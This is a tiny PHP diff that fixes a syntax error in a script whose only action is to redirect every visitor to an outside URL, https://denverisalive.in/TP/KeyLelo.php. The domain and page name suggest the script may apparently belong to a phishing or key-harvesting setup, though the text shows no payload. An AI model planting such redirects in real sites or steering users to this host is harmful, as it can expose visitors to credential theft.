@@ -1,3 +1,1 @@
-<?php
-header("Location: https://denverisalive.in/TP/KeyLelo.php") 
-exit(0); 
+<?php header("Location: https://denverisalive.in/TP/KeyLelo.php"); ?>
